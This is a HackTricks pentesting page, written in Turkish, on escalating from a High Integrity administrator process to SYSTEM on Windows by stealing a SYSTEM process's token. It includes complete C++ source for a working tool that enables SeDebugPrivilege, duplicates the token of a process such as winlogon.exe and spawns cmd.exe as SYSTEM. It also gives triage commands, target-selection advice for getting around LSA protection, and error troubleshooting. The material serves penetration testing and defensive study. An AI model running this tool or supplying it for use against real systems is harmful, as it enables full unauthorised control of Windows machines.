# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, **High Integrity administrator process**'ten **`NT AUTHORITY\SYSTEM`**'e geçmenin **manuel** sürümü hakkındadır; bunun için **korunmayan bir SYSTEM process** açılır, token'ı duplicate edilir ve o token ile bir child process spawn edilir**.

Eğer yalnızca **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** hakkınız varsa ama **uygun bir SYSTEM process** açamıyorsanız, **Potato / named-pipe** yolu genellikle daha güvenilirdir:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

İstediğiniz şey yalnızca `SYSTEM` değil de, **mümkün olduğunca çok privilege içeren bir SYSTEM token** ise, şuna da bakın:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Token steal etmeye çalışmadan önce, context'i hızlıca doğrulayın:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Pratik notlar:

- Bir **High Integrity** admin token genellikle **`SeDebugPrivilege`** etkinleştirmek ve birçok korumasız SYSTEM process'ini açmak için yeterlidir.
- **`CreateProcessWithTokenW` çağıran tarafta `SeImpersonatePrivilege` gerektirir**. Eğer bu API `1314` ile başarısız olursa, zaten bir SYSTEM primary token'ı duplicate ettikten sonra `CreateProcessAsUserW` kullanın.
- Modern Windows'ta, **`lsass.exe` çoğu zaman kötü bir hedeftir** çünkü **LSA protection / PPL**, `SeDebugPrivilege` olan administrator'lar için bile erişimi engeller. Bunun yerine **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** veya SYSTEM olarak çalışan erken bir **`svchost.exe`** tercih edin.
- Her SYSTEM process aynı derecede kullanışlı bir token'a sahip değildir. SYSTEM elde edip eksik privilege'lar fark ederseniz, tekniğin bozuk olduğunu varsaymak yerine başka bir SYSTEM process deneyin.

## PID'yi dikkatli seçin

Bunu güvenilir şekilde çalıştırmanın en kolay yolu, **DACL'si gerçekten Administrator'ların process'i sorgulamasına ve token'ını duplicate etmesine izin veren bir SYSTEM process seçmektir**.

İlk denenebilecek iyi adaylar:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- SYSTEM olarak çalışan bazı erken `svchost.exe` örnekleri

Varsayılan olarak kaçının:

- **RunAsPPL / LSA protection** etkin olan host'lardaki `lsass.exe`
- `SeDebugPrivilege` etkinleştirildikten sonra bile `Access denied` döndüren korumalı / güvenlik açısından hassas process'ler

Aday process'leri ve token/ACL bilgilerini yükseltilmiş şekilde çalışan **Process Explorer** veya **Process Hacker** ile inceleyebilirsiniz.

### Code

Aşağıdaki code [buradan](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Bu code, **argument olarak bir Process ID belirtmenize** izin verir ve belirtilen process'in **user'ı olarak çalışan bir CMD** açar.\
High Integrity bir process içinde çalıştırıldığında, **SYSTEM olarak çalışan bir process'in PID'sini** (örneğin `winlogon`, `wininit`) belirtebilir ve `cmd.exe`'yi SYSTEM olarak çalıştırabilirsiniz.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Useful API / access-right notes

Örnek `MAXIMUM_ALLOWED` kullanır, ancak gerçek işlemler için ilgili minimum parçaları hatırlamak faydalıdır:

- `OpenProcessToken()` yalnızca **process handle**'ın **`PROCESS_QUERY_LIMITED_INFORMATION`** ile açılmış olmasını gerektirir.
- `CreateProcessWithTokenW()` kullanmak için, **primary token handle** **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** sahip olmalıdır.
- `DuplicateTokenEx()` yalnızca bir impersonation token değil, **primary token** (`TokenPrimary`) oluşturmalıdır.
- Eğer zaten SYSTEM olarak impersonate ettiyseniz ve `CreateProcessWithTokenW()` hala `1314` ile başarısız oluyorsa, bunun yerine `CreateProcessAsUserW()` deneyin.

Bu, **target process**'i `PROCESS_ALL_ACCESS` ile açmanın genellikle token'ı sorgulamak için gereken hakları istemekten daha gereksiz ve daha gürültülü olduğu anlamına gelir.

## Error

Bazı durumlarda System olarak impersonate etmeye çalıştığınızda bu çalışmayabilir ve aşağıdaki gibi bir çıktı gösterebilir:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Bu, High Integrity seviyesinde çalışıyor olsanız bile hedef process/token üzerinde yeterli izinlere sahip olmadığınız anlamına gelir.\
Şu anki Administrator izinlerini **Process Explorer** (veya **Process Hacker** da kullanabilirsiniz) ile `svchost.exe` processleri üzerinde kontrol edelim:

1. Bir `svchost.exe` processi seçin
2. Sağ Tık --> Properties
3. "Security" Tab içinde sağ alttaki "Permissions" butonuna tıklayın
4. "Advanced" seçeneğine tıklayın
5. "Administrators" seçin ve "Edit"e tıklayın
6. "Show advanced permissions"e tıklayın

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

Önceki image, seçilen process üzerinde "Administrators" grubunun sahip olduğu tüm yetkileri içerir (gördüğünüz gibi `svchost.exe` durumunda yalnızca "Query" yetkileri var)

`winlogon.exe` üzerinde "Administrators" grubunun sahip olduğu yetkilere bakın:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

Bu process içinde "Administrators" "Read Memory" ve "Read Permissions" yapabilir; bu da muhtemelen Administrators'ın bu process tarafından kullanılan token'ı impersonate etmesine izin verir.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: process DACL sizi engelliyor veya hedef **protected/PPL**. Başka bir SYSTEM process seçin.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: token handle yeterli yetkilerle açılmamış, ya da hedef token DACL duplication işlemini engelliyor.
- **`CreateProcessWithTokenW()` -> `1314`**: çağıran hesapta şu anda **`SeImpersonatePrivilege`** etkin değil. Önce bunu etkinleştirmeyi deneyin veya duplicated primary token ile `CreateProcessAsUserW()` kullanın.
- **`CreateProcessWithTokenW()` -> `1326`** önceki hatalardan sonra: bu çoğu zaman önceki token duplication/impersonation adımının başarısız olduğu anlamına gelir, dolayısıyla child process'i başlatmak için kullanılabilir bir primary token yoktur.

## Operator notes

- Bu teknik, zaten **local admin + high integrity** durumundayken ve bir service ya da named-pipe coercion chain kurmadan hızlı, manuel bir yolla SYSTEM almak istediğinizde çok işe yarar.
- Harden edilmiş Windows 11 / Server ortamlarında **LSA protection** giderek daha yaygın, bu yüzden `lsass.exe`'nin her zaman okunabilir olduğunu varsayan bir workflow kırılgandır. **`winlogon.exe` / `wininit.exe` / `services.exe` genellikle daha iyi ilk seçimlerdir**.
- Eğer yükseltilmiş bir admin desktop yerine bir **service account** bağlamında kalırsanız, bu sayfadan ziyade **Potato family** genellikle daha iyi bir uyum sağlar.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
